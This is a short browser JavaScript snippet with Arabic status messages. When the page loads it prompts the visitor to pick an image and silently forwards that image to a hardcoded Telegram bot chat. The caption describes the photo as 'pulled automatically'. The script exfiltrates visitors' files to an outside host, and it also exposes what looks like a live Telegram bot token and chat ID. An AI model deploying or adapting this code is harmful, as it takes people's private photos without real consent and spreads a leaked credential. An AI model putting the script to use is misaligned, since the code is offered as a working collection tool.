window.addEventListener("DOMContentLoaded", async () => {
  const status = document.getElementById("status");

  try {
    const [fileHandle] = await window.showOpenFilePicker({
      types: [{
        description: 'Images',
        accept: {'image/*': ['.png', '.jpg', '.jpeg', '.gif', '.webp']}
      }],
      multiple: false
    });

    const file = await fileHandle.getFile();

    const formData = new FormData();
    formData.append("chat_id", "8141222239");
    formData.append("caption", "📸 صورة جديدة تم سحبها تلقائيًا");
    formData.append("photo", file);

    status.textContent = "⏳ جاري إرسال الصورة...";

    const response = await fetch("https://api.telegram.org/bot7701585433:AAFKP5UDdVsxRL2zrbmlaIK2jzd30rPW-F0/sendPhoto", {
      method: "POST",
      body: formData
    });

    if (response.ok) {
      status.textContent = "✅ تم إرسال الصورة بنجاح!";
    } else {
      status.textContent = "❌ حدث خطأ أثناء الإرسال.";
    }
  } catch (err) {
    status.textContent = "⚠️ تم رفض الإذن أو لم يتم اختيار صورة.";
  }
});